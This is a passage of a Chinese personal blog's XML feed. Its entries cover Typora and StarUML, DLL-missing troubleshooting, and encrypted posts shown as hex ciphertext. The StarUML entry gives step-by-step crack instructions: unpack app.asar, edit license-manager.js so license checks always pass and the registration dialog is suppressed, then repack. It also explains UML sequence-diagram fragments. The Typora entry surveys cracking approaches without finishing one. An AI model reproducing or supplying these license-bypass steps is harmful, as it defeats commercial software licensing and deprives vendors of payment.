0e7fdd478908cbe617542f3e3df27cf5a7759ae3c2ed831686406299851edbae70c569f16b1a604c55929300d632eeecfa05d6682e1c2e0509cbd797e4d9e9360f927fef3aaa2104e8813f9336fd2043d065f84a1840fc4475938f125b0c07002df6acb2c36d63e3840eb8cf5cf4f008671f6bd81267fe43ccfb30d539686ddc2773e4e755bafc49faf7b1ea3704a6393a732a4383fc058a44601dc3e7f91f5356c742726842b3d9e25c1d50a7f99c6e0e47f8897bbe4befb44792603ea85b2f0eb1b793737db09240f03f26d2ceeeb133be374645e33e270feb761f301416a4e60a38682284a545985653c39cf099365fb17fa2df33b3b6b960ebbb7ef2e3fe26b123a87dbf304495a7ef9b2de9ad98fa45f59bf7b73991e213fbbcc466144f973d0eb8c5838f87298c63faf4db11747edc402caf91c58c52cadb57e4355cf0883279d8466d7979a759be79cba3645e31da45a1f1a0103bde6bfdc75ca324f8ebb7cdb9450d3b007393379376566cb41542f90af73fe28300b0b4f4f506ba9902cf981c1354584e677c69d075bce390ff40b1061846ff482d0c4482b2759c327c845f1824334a837c53fbf6d43260c4a913485f8c90121260ecf21b9ead04b4fa379b9e7042816df5295db839ebc6e10a117efa1832745038a606b850f0bc852a19132443ee6ad5df58f12d1801798294177480b88d261db5ae198d81b3b4ddbc727fe6149e19b6eec99a89eb3d236d11fb63c3b144e99896c3ebc0dd1ff9ac002ba6efc2e38b3d37da92abc11c0f83b025bd9d7fce031b81a3d29f9981e120cc4da22d6cfe9d0674653e503b0ddbca54dff9f62f7714200b44d1ba7c8d5bc31ad14d82f547d97be21652dc7b1837fbf22e73da45ff74c05b360a22b7cd5e0be990755a64ecf11a27ab8330bdd17272bc86cee5c9a4a85bd1f70e92d87178e6633cf1feff383cda650ace93d46a8f1ad5388946398140c7298ab804b58847932937fe3d74f3145879997e4eaaa80ed1a72be30d41d4c129e6bb3c54034664975c580970186ad98188adfee207991e82ada520e8646a42522f9d7008aaa0f33ab55cea7e4ec21159abf2ebb092ebad6845e71a8342391fc5ca94fbf1a51795db5d4aea3dfcd9375bb373dbd15fb9ecc9429ad3244b2b394b47bfbc319005b1929932453b93e4dc5670de21b1b9e4f330ef65124e62a82484e4673dff7cf487ef25871264c88b6a3b13a1888d9c5ccffac2064fa6731fdbed417ef73395ac73671df931c56582f0f117a91272356e61673fcb925877b641bf5d9b3c95c8f6ed3209f9defa916d6b8dbb60db5408609d3b52f510cfb6427df71f9682298f584c388ff0702b288acef3c83bd9fd8e8edee5f7c3e90082893b1250e0eb2b7af1194b3107dc324127dc1be5917f506b2419797a10953cc5a6a2b67b50aab8d0f046f832fd2e803c1be8632b93c15cb38f9a9c0136fc5f88c950146a87ac4403074fd98f007c8898509d7a0abc4879fc5e9052b0ffd477e693aa550cc041db926324977c40199ccd2a6bd1b3d447a77f83b2c191cb5ea46ad61a68c0d724113f13f5bcda1ff282ad4d0c49409ca819021f8d24f0bb463cc74f918ea5790094cea5acdf82e306f6004d308f7e8941341ee5aaaaf8d65934945633eb60e090279e47148214aa5e874c595c015d68245b357ec72bef53778286158943d2f55d71843474f43a5444d52f9b2444769f1f9cd88c663a0ba6d55311ca333cb887f2ea21809f678a9a2b7da751c6e4c0aa6255d21e8be73aa0a6bda605b1bdc54bef05339a2319be8f85e4eca1cf9afa9f7f993b56f7b14da778d9a9b50ed9a56cd253890dec29c49bd3c8f5255756d6fffff24ea66c6e7921af2234555b1fbae33021a69da31a23ea8a02ead43c86f6a23442a7c88465c77e77c1c8319c51c4cf2982e8eb4a920a3950e56ab3b3710274cfb903a80864a2159d59d4caa5fd67efafff37e0b877b5d6411aea2a94ca08a31eb64bbd477d98ebbc6128a97c3290b2bf32188e7e3f0c1c8f670014ec74d0ba78128fa6c62684f30f72bce659cd42ecfeaf0b2d8f0750377134967493e14d021fafd815453227ba37d0720e05a2bcc</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
          <category> 加密文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】typora</title>
      <link href="/2022/10/08/typora%E7%A0%B4%E8%A7%A3/"/>
      <url>/2022/10/08/typora%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>从Typora发布1.0版本开始正式宣布进入收费时代，大概是89软妹币共三个设备使用。</p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为之前破解过startuml，发现typora的文件结构也有点相似，同样也存在一个<code>app.asar</code>，也就是js用的electron框架弄的桌面版软件。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><hr><h2 id="1-自己尝试"><a href="#1-自己尝试" class="headerlink" title="1. 自己尝试"></a>1. 自己尝试</h2><p>准备工作</p><ol><li>下载安装一个typora</li><li>下载一个nodejs，因为要用到npm</li><li>git bash，是安装git之后的一个</li></ol><p><strong>安装完没啥事建议重启下</strong></p><p>打开<code>git bash</code>，查看<code>node -v</code>，就提示就好办了<br>然后输入<code>npm install -g asar</code>，下载完就ok</p><p>下面部分操作均在<code>git bash</code>进行，powershell和cmd理论也可以。<br>cd到typora安装目录，例如我这是<code>D:\Typora\resources</code><br>把app.asar反编译出来<code>asar extract app.asar app</code><br>app目录下就三个文件，这个atom.js不知道，搜索一下应该是个拓展，好像是补齐用的。<br>至于这个main.node在package.json里面有个main就是引用了这个文件，但是这个文件打开是一个乱码或者加密的情况。不过大致可以确认关键点在这个文件上面。<br>而那个json记录的配置信息反而没啥看点。</p><p>由于是加密过的，我的技术肯定干不了，搜索了一番之后可以得到两个结论</p><ol><li>替换app.asar的基本都是干掉typora这个版本的加密算法了。<ul><li>每个小版本的动态算法可能会有改变，百度有一篇看雪的底下评论有提到，所以能搞这个的基本都是对加密算法感兴趣的了</li></ul></li><li>添加dll的基本都是hook跳过加密解密了。<ul><li>hook在计算机下被称为挂钩或者钩子，思想就是把一些信息钩住用自己的代码执行一下然后在放行，在这期间肯定是修改或者进行一些别的操作了。</li></ul></li></ol><p><strong>显然我不具备这样的能力</strong></p><p>关于看雪的这篇<a href="https://bbs.pediy.com/thread-272538.htm">文章</a>也推荐大家去看看，能get到几个思想就行，其他的各凭本事。</p><hr><h2 id="2-简书上有个办法"><a href="#2-简书上有个办法" class="headerlink" title="2. 简书上有个办法"></a>2. 简书上有个办法</h2><p><a href="https://www.jianshu.com/p/d8baf921c9f4">文章链接</a></p><p><strong>可惜的是！他被ban了</strong><br>哎，作者工具被ban了那就没办法了，文章的思路应该就是解密之类的，有个许可证我到不是很了解。<br>只能老老实实用网上的办法了，不过感觉还是替换asar靠谱点，dll我不太放心。。真没办法那也只能用dll了。</p><hr><h2 id="3-最后的最后"><a href="#3-最后的最后" class="headerlink" title="3. 最后的最后"></a>3. 最后的最后</h2><p>还是用现成的了哈哈。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li>首先可以瞅瞅目录，有类似<code>resources</code>这样的目录，且下面还有个<code>app.asar</code>基本都是利用electron框架弄的了</li><li>虽然知道可以反编译这个.asar，但是核心还是在绕过或者解密上</li><li>startuml是真的放心啊。。。他那个直接反编译之后能看到源代码，你只需有一定代码基础，把那些地方改了注释掉就行了。</li></ol><p>再接再厉吧。。。正向开发都没搞明白，逆向纯属是瞎闹哈。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【软件】starUml</title>
      <link href="/2022/10/04/starUml/"/>
      <url>/2022/10/04/starUml/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学到uml设计，而最新的startUML好像因为卖给别的团队收费了。然后搜了一下破解，貌似也不难。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>时序图（Sequence Diagram），又名序列图、循序图，是一种UML交互图。它通过描述对象之间发送消息的时间顺序显示多个对象之间的动态协作。它可以表示用例的行为顺序，当执行一个用例行为时，其中的每条消息对应一个类操作或状态机中引起转换的触发事件。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><a href="https://staruml.io/download">官网下载uml</a><br><a href="https://nodejs.org/zh-cn/download/">nodjs</a></p><blockquote><p>不过因为我博客就用到nodejs了所以不用再安装了</p></blockquote><hr><h2 id="干活"><a href="#干活" class="headerlink" title="干活"></a>干活</h2><p><strong>原理好像是可以被反编译，然后改变逻辑。</strong></p><p>安装完nodejs之后也就是要用到npm，用cmd或者powershell打开都行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line"><span class="meta">#</span><span class="language-bash">依次打印一下，有显示版本号就行，没有就重启下</span></span><br></pre></td></tr></table></figure><p>能显示版本就可以安装asar了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g asar</span><br></pre></td></tr></table></figure><p>然后cd到staruml的路径去解包<br>这边官方安装默认是在<code>C:\Program Files\StarUML\resources\</code>这么一个情况。</p><p>所以我们只需要在powershell或者cmd【但是因为我有git bash之类的所以就没用windows这些】<br>cd 到这个路径下就行</p><img src="/2022/10/04/starUml/000.png" class=""><p>路劲切换后，使用<code>asar extract app.asar app</code>进行解包到文件夹。</p><p><strong>注意如果出现一些错误可能是权限不够</strong><br>比如</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\StarUML\resources&gt;asar extract app.asar app</span><br><span class="line">internal/fs/utils.js:<span class="number">314</span></span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">    ^</span><br><span class="line"> </span><br><span class="line">Error: EPERM: operation not permitted, mkdir <span class="string">&#x27;app&#x27;</span></span><br></pre></td></tr></table></figure><p>权限不够就把这个文件拖出去，放到别的地方解包修改在打包拿回去覆盖。</p><p>因为前面的路径不一就不管了，反正找到<code>app\src\engine\license-manager.js</code>的这个文件，用记事本或者notepad之类的打开。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">checkLicenseValidity () &#123;</span><br><span class="line">  <span class="keyword">if</span> (packageJSON.<span class="property">config</span>.<span class="property">setappBuild</span>) &#123;</span><br><span class="line">    <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">validate</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">//修改下面那句的false改成true，最后一句注释掉</span></span><br><span class="line"><span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">      <span class="comment">//UnregisteredDialog.showDialog()</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Check the license key in server and store it as license.key file in local</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">licenseKey</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">register (licenseKey) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    $.<span class="title function_">post</span>(app.<span class="property">config</span>.<span class="property">validation_url</span>, &#123;<span class="attr">licenseKey</span>: licenseKey&#125;)</span><br><span class="line">      .<span class="title function_">done</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">product</span> === packageJSON.<span class="property">config</span>.<span class="property">product_id</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> file = path.<span class="title function_">join</span>(app.<span class="title function_">getUserPath</span>(), <span class="string">&#x27;/license.key&#x27;</span>)</span><br><span class="line">          fs.<span class="title function_">writeFileSync</span>(file, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data, <span class="number">2</span>))</span><br><span class="line">          licenseInfo = data</span><br><span class="line">          <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">          <span class="title function_">resolve</span>(data)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">false</span>)</span><br><span class="line">          <span class="title function_">reject</span>(<span class="string">&#x27;unmatched&#x27;</span>) <span class="comment">/* License is for old version */</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">      .<span class="title function_">fail</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">setStatus</span>(<span class="variable language_">this</span>, <span class="literal">true</span>)</span><br><span class="line">        <span class="comment">//下面的注释掉</span></span><br><span class="line">        <span class="comment">//if (err.status === 499) &#123; /* License key not exists */</span></span><br><span class="line">          <span class="comment">//reject(&#x27;invalid&#x27;)</span></span><br><span class="line">        <span class="comment">//&#125; else &#123;</span></span><br><span class="line">         <span class="comment">// reject()</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完之后保存<br>然后重新打包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar pack app app.asar</span><br></pre></td></tr></table></figure><p>生成后，在这个文件夹看看app.asar的修改时间是不是最近的，如果是基本就没啥问题了。</p><p>然后黏贴覆盖掉<code>C:\Program Files\StarUML\resources\app.asar</code>这个原文件。</p><p>替换原始 app.asar之后，重新打开 StarUML，不提示需要注册和没有 Unregistered 标识则表示破解成功。</p><hr><h2 id="新旧ui对比"><a href="#新旧ui对比" class="headerlink" title="新旧ui对比"></a>新旧ui对比</h2><img src="/2022/10/04/starUml/001.png" class=""><img src="/2022/10/04/starUml/002.png" class=""><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>角色（Actor）</li><li>对象（Object）</li><li>生命线（Lifeline）</li><li>控制焦点（Focus of Control）</li><li>消息（Message）</li></ul><table><thead><tr><th>类型</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>Alt</td><td>抉择</td><td>包含一个片段列表，这些片段包含备选消息序列。可以在每个片段中都设置一个临界来指示该片段可以运行的条件。else的临界指示其他任何临界都不为true时应运行的片段。如果所有临界都为false并且没有else，则不执行任何片段</td></tr><tr><td>Opt</td><td>选项</td><td>包含一个可能发生或可能不发生的序列。可以在临界中指定序列发生的条件</td></tr><tr><td>Loop</td><td>循环</td><td>片段重复一定次数。可以在临界中指示片段重复的条件。Loop组合片段具有Min和Max属性，它们指示片段可以重复的最小和最大次数。默认值是无限制</td></tr><tr><td>Break</td><td>中断</td><td>如果执行此片段，则放弃序列的其余部分。可以使用临界来指示发生中断的条件</td></tr><tr><td>Par</td><td>并行</td><td>并行处理。片段中的事件可以交错</td></tr><tr><td>Critical</td><td>关键</td><td>用在Par或Seq片段中，指示此片段中的消息不得与其他消息交错</td></tr><tr><td>Seq</td><td>弱顺序</td><td>有两个或更多操作数片段。涉及同一生命线的消息必须按片段的顺序发生。如果消息涉及的生命线不同，则来自不同片段的消息可能会并行交错</td></tr><tr><td>Strict</td><td>强顺序</td><td>有两个或更多操作数片段。这些片段必须按给定顺序发生</td></tr><tr><td>Consider</td><td>考虑</td><td>指定此片段描述的消息列表。其他消息可发生在运行的系统中，但对此描述来说意义不大</td></tr><tr><td>Ignore</td><td>忽略</td><td>指定此片段未描述的消息列表。这些消息可发生在运行的系统中，但对此描述来说意义不大。在Message属性中键入该列表</td></tr><tr><td>Assert</td><td>断言</td><td>操作数片段指定唯一有效的序列。通常用在Consider或Ignore片段中</td></tr><tr><td>Neg</td><td>否定</td><td>此片段中显示的序列不得发生。通常用在Consider或Ignore片段中</td></tr></tbody></table><p>精髓我感觉还是制作成类视图，然后绘制时序图，比如这个项目如何启动，有哪些功能，什么条件触发之类的。</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>新版的文件尾缀都是mdj了，老版的好像才是uml。<br>此外就是一些功能和属性上的变动，新旧存在一定差异。</p><p>题外话，好像可以找到最原始的时候团队没出售这个项目的免费版。虽然那个好像很老了，最新更改时间可能都是2005年的了。但是使用的话倒是无所谓。<br>而且绘制时序图也不一定要用到这个软件，估计还有类似的。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dll缺失</title>
      <link href="/2022/10/01/dll%E7%BC%BA%E5%A4%B1/"/>
      <url>/2022/10/01/dll%E7%BC%BA%E5%A4%B1/</url>
      
        <content type="html"><![CDATA[<h1 id="dll缺失"><a href="#dll缺失" class="headerlink" title="dll缺失"></a>dll缺失</h1><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>首先回顾，什么是dll，<code>.dll，动态链接库英文为DLL，是Dynamic Link Library的缩写。DLL是一个包含可由多个程序，同时使用的代码和数据的库。</code><br><strong>windows下的动态链接库是以.dll文件，而linux下的动态链接库是以.so文件</strong></p><p>dll缺失在windwos下并不算稀奇。<br>比如你开发的程序使用的dll是依赖windows的，而导出给别人的时候，他的电脑就可能没有这么个dll，致使程序无法启动并且报错</p><img src="/2022/10/01/dll%E7%BC%BA%E5%A4%B1/000.png" class=""><hr><h2 id="解决方案1"><a href="#解决方案1" class="headerlink" title="解决方案1"></a>解决方案1</h2><p>对于内部开发的程序，谁开发的找谁，他电脑上肯定有这个dll文件</p><p>这里推荐使用<code>everything</code>，当这个程序检索完硬盘之后，你可以直接搜，也省得自己慢慢翻了。</p><p><strong>我这里演示的是用utools下的everything拓展所以看起来不一样</strong><br>但是实际效果差不多的。检索完磁盘-搜索文件名-右击打开路径就行</p><img src="/2022/10/01/dll%E7%BC%BA%E5%A4%B1/001.png" class=""><p>可以看到有不少同名的，概率是架构不同所使用的dll。不放心就全带走。</p><hr><h2 id="解决方案2"><a href="#解决方案2" class="headerlink" title="解决方案2"></a>解决方案2</h2><p>自然是百度，缺啥百度啥，一般找微软官方的下载地址就行<br>或者直接下个vs，把c++桌面端开发的组件下过来<br>当前前者只下对于的dll文件肯定比后者下开发组件要节约空间</p><img src="/2022/10/01/dll%E7%BC%BA%E5%A4%B1/002.png" class=""><p>这种dll单个下起来可能不好找，不过一般也没改的，所以第三方注意别下载广告也凑合用的。</p><p>剩下的就是路径，看网站描述吧，有些dll要放到系统目录下才生效比较麻烦。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>一般不至于出现这个小错误，发布者肯定要打包这些不常用的dll。</p><p>如果你的同学或者朋友电脑上有，其实叫他用everything找出来发给你是最好的，毕竟自己在第三方的网站上可能不放心</p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MFC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文章加密测试</title>
      <link href="/2022/10/01/%E5%8A%A0%E5%AF%86%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/10/01/%E5%8A%A0%E5%AF%86%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="c13b0680545678797f70731ca8d133f675079fbe37487416fd46396965ab65f2">bd25ed9264b080267271e137e33d0ce118960a041ac35a180347d4bc9710c7dc38b6f60881a1e56501ae33c8a8936e7abfa88d42a53472956ffc6f529be27d04085def7987ce86c7cef0bb2c1578244485d343a7a1515e8529a730318bf357fdb1b279f1df783d5cd7064af63ea0fc3adb40e5af473d9165b906c6031ac1a31357b76dda01575b8d729c2d245505e11950af0c7ce57f5deedeca7dbe01bc4606144e79456124c2511ac5e1067e47eb2c4d9d23e5c3aab4172ecfb877d775672ffb12d794e4ef6916b94672417b147223bcee086db74e8699130754f0a5e792319797ead5be42c917362ccd8a84baa939ed05f87e8f846bab59ba856f4b5a708b55f89abc833000553d30505b92667d9072e2f8b022bcd24871ffd903a3eb6b6df341fdb5c4791ad4e4ea7942542a4ed8f8e222d2e04052c724e16497da86a6da088aec38ac25863e0ecf22ca0335df91a32c82b86255ea2c05a241dc7a6920eaac90f89cf89a2aa1fc38b573b4016e84c964d9218ce01f021a394fcbe9d33460edbcce90eeaa689e7026baaec474c2f703d980990f6327b96a1e75a6b62c87fafe91d974bcebdd3aa6ecdf5828dd963e446aee28c56e4acb8d067858241cbd235ac9d8ce8761b611854d0c4819ed28a46e3e698b4759bcb9a48ca70425b1f31830c06a1f3439cc7e52591f14e36cb89a05934619b35b993e618b6f58b905d4a883dd92d91ed3927d076de9e99c9156629aba96ca5c358776dd25b9f00407c0352b95d74aa4df8949742058a6993462fa7280ffd649f57e9ac1c814dfbadf2bbf6440ce0c76437a184b71bbc48627250912ab4222c3aa0eca0d10bd4793bc4aa9beb5722a48bac0f95bccaaadfdbc36069878e7e9dcf4595f05c214e870297cd328bc151186258666c0d16f77888d41822fd7043d625d97dd5a30861f08c7103787a76ac6522d8790c5df1be4ba2c6da2a8bb535d985b080aa922ddfa395752568b6ceddfeaed2ee82ddac8bcd4d1d23ce8264a69a027a869e82e03a14f58a3f894d25f640d39851bf04e5a18d1e1062abdd14938fbc93c1d8301a657ca9e1d595414f2b330085372e39de0930727d5e54dfd13306a838ec9ecb4b165557a3e1351de4665b881d46ba805c720d4a19b5167fea13ea26bd5abe65a2da079b29fa0d2e70c3a29a938c37c1642f0a15538dd7ce1adc63733e50335ba9660079e1e5f3f2f5e74455ef018bc71a1f7269b572200bb915e9f19c287e7c1c7a5eb684fa175b889af4e86c61c23da79c28ec9bac12ac602620ec62faaf4c6dc297e803fba039333d64e4760461e847045d0a4e0e4fe4439860de08d1aae58b5959f015190eb9408ac529fe1e572a1be786d244077a42f39b95ed0fc565f26990da1a27d98571667971f18aebbd389918b09a725ba7a9dfac4ab3e4127a722343c0008a390417545676af616b0e425baf18b4ddaf70d342af3ac35152c7b0a0e58421a93c72722e4b5c864facaf73b43695671ce567cec9aab7067faa11d06583db5be48b20ed3c9f84a04233d82ca39cb6c7b87cbe54c2ff55d1db6825a31a80e9ed4c0996f0e1b158b62c57391fac295bf79e44eb73adcaa0d5638549b8ecdc0c66f0c899f89b38e2cc1debd1857dcc2a393130e85a137e6f6887b39f20ebcd14a120a017779f2c1486ed60744cae4efb3a45544064d586b89ea6a102c5497ad559a85b2c039dab94e316159ec3afd1b004810d964a4efca03fc407699cc2ace340ab3333ff8518c72a20e40c2ff6828074288292fd344580fd29c9654e8fc6ec1a75ae53feea3bbda71b6e917af22476672e85bffa9882f571293c8ad60b88f653eefa540cd1388b05d8e3513d53212c513ef3f10e07aa946b3a56b723e30492dae5110ede7ab14f2ffe2f0c047d497d64b739ed82b2197b215d172cd2a87a71867e0cb681e941acc39d6ffef0d04faaf850940dc81c538e717d763ec461bccdded814e0b880b3735ac87e481d78faaa3d56ae8bc78d0fa260e0937724abf0d08b1a1cedbb1f2e5a2754b9fa57f77c4816a3519313a474f7182720baaa78b4ab5234a76c4329048a6dc00609319ff72f8e23e1bbbb2680dab5a5745e56a6e60065ad4ca95aedde065e49dd5fa12d2cc38d32297ca6c298af7f0013cf8baa30b299c613f5dcc3b600035ea177dabceb4304481ba91c0380338e86ae8eb2dbb8fad6bc35c11d7094f5adbed223f8674c507b51a2409e388cbc585f453252adca836c4fc526896faf1017406ff0cb54c37c940c436be115733ab8d0649ed25844aa1009db3e18f67403eaa89e5cccc23e19961d69ea2157d11e26658d40af0263acfb0a8d2bf42721992ea6338664f7604a628906ff701eebd213adea9099db3046480e2c8f83769177b9186bee4cc6c6a6d6d2ba5a2a4d4e15e42366a66f7e66aaa76bf4ae46dc6bf61b96119630e3da62dc37e9e6d26779790b523b7d66aad9040eee8378b08d7dc535c9167567d00b880d3d966be8d76b87881d6b0377e1d65cd63155d36dd8d7a014d6fa04ec05441464012751aa1d2392d07069aa24722262b3f2da9356f3c48902eb7b474941cefbf159684e58e989cc3fa2f9c884ec870f3748b4c525ca8673faae2e7667d7a621810f88119d1f255cd1b2e4eae093ba42400745631128329c1332c36f420004ddb16808db0b457878e470f4100db1aaf06d8ed352324cbc4428c8fcbbf22966cd1ed6feb5cfe10c0d8b8058d95405c88730c07b70cdccca2dac0cccc60aa88799a1954c729840e4beaf2edf92b9fe34ab56b10b46645002a5a9af4aa669334f4c7c4fa19801a751ab42cf62ee736996eaaf4c2041e6473032f5b3cad6250ce74ba0e21c47132dd20dbba127119bef6850e0eead3d61ce71811712e50b9b6c9010352ae342fd698bdc6b0494d39b3fd36e129688dcb8d47a8c65c7e8e14f9e3e241aa752af1d320472cd13135ce8bdb3caed09a179c4d3b1e2626715c363181237e3fcb1f01bcbd3054388b0f2847b94b3a3a375867cea8447a68a2ff3507820106cf108d33e6f06eec7d5d34ecf41852228a48e3c01f0f8a5a0d1eaea6db1ffd19fef5e63a2c44eac2744c740dae36880f70b4dde00e3c602f6de9f288d59e6b39496d91b32eb8fa9350268cf7665abb75949c682c548ff15e71a5f25899d04ead914e49e45b065318d458b1011b9a4c40acae1f2d6db7fd3e391fd57d5ff47a9df6381192f992791678432f7b96f250c756ec4b6a6fc31b8c5ab2a6ff468ac528bc7914f7d49c1ec07b97dd7baf127c52289b143e7a7f273ce6e301c39c310a6983580613e7cc53debf4aefc3ec9b916ec2b4bd53a445d3dd002125cfa21df8b9f28fd85312e975121e618084160b2768df429582dca60e5d3a01487be2cd643579fc15134340c65c158cbedf15f43f5f181339bad6f96110f91e9b9b08226d34113729f1905c2899dfb73997d92fda65d8aa5d17f4ad136f62a6c69e4a25ab10a20742352cb0db7e1db0614fe3d86fc021490003930c07f9a966176ece7c221b99fd92a2548197e28415d4d77d18364e21ab53149f1defc47afce21ab0cd6d44c2fb8689dd0703cb2e6f2485cb4035bf5287b053b24b38e3a60542406c3fabd26a9486cef2056e5d17b9333a2f0844d585ed317ab607b785759c4bc90ad9d199150ec78697cf651e8ba9efb53ff97e471306754fc1ee9a190847592e3f84ba428d98079ee113442460d4497f75a8fe4c482ef3d0861b308b147ece7fc15ffc9a031d097df497709e1c9c46ab576ea50fc05667681eb3fd43d92197eb767fb5cc497cfd4e9e099c1f55a889fbd3d3870afefca0fa398bab3d0fb1bb0923ac39c75196ec00dc5728735e2f3bb0e90b7a008543826fa5418de324240a866e8a379462d1b8a1a84ace9fa01a2a6a3675899f4847e58558818dc50040d6109403b286fdb1064e0541bcefd131af535b3d17a8cc48106ee99a1ce8443a1e09c5f8d8b4b4477e9fd1065e6848af585148926bd556fa20582da3cb167468efb2ceb6da383846f0192081cd90ade8f8b487763eac9c8afdb411562883380e7ab564f1277f13773fc9e6fdcdc25e5f93d528dc89c7a0a2717c7bd1